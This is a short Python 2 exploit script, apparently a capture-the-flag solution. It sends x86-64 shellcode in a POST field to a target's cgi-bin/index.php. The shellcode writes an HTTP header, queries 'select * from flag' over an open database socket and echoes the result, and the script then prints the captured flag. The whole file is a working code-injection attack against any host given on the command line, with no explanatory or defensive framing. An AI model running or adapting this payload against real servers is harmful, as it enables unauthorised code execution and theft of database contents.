#!/usr/bin/env python2

import sys
import requests
import re
import logging
import hashlib

# import httplib as http_client
# http_client.HTTPConnection.debuglevel = 1
# logging.basicConfig()
# logging.getLogger().setLevel(logging.DEBUG)
# requests_log = logging.getLogger("requests.packages.urllib3")
# requests_log.setLevel(logging.DEBUG)
# requests_log.propagate = True

shellcode = "\x55\x48\x89\xe5\x48\x31\xc0\xb0\x01\x48\x31\xff\x48\x89\xc7\x48\x31\xd2\x52\x48\xb9\x6d\x6c\x0a\x0a\x0a\x0a\x0a\x0a\x51\x48\xb9\x20\x74\x65\x78\x74\x2f\x68\x74\x51\x48\xb9\x74\x79\x70\x65\x3a\x20\x20\x20\x51\x48\xb9\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x51\x48\x89\xe6\xb2\x20\x0f\x05\x48\x31\xc0\x50\x48\xb9\x72\x6f\x6d\x20\x66\x6c\x61\x67\x51\x48\xb9\x20\x20\x20\x2a\x20\x20\x20\x66\x51\x48\xb9\x03\x73\x65\x6c\x65\x63\x74\x20\x51\x48\x31\xc9\xb1\x18\x89\x4c\x24\xfc\x48\x8d\x74\x24\xfc\xb0\x01\x48\x31\xff\x48\xff\xc7\x48\xff\xc7\x48\xff\xc7\x48\xff\xc7\x48\x31\xd2\xb2\x1c\x0f\x05\x48\x31\xc0\xb0\xff\x48\x29\xc4\x48\x31\xc0\x48\x31\xff\x48\xff\xc7\x48\xff\xc7\x48\xff\xc7\x48\xff\xc7\x48\x89\xe6\x48\x31\xd2\xb2\xff\x0f\x05\x48\x89\xc2\x48\x31\xc0\xb0\x01\x48\x31\xff\x48\x89\xc7\x48\x89\xe6\x0f\x05\xc9\xc3"

def main():
    if len(sys.argv) != 2:
        print "usage: exploit.py <ip>:<port>"
        sys.exit(-1)
    
    ip, port = sys.argv[1].split(":")

    url = "http://%s:%s/" % (ip, port)

    payload = {'shell': shellcode}

    r = requests.post(url + "cgi-bin/index.php", data=payload)

    res = re.search("(OOO{.+})", r.text)
    print "FLAG:", res.groups()[0]


if __name__ == '__main__':
    main()
    
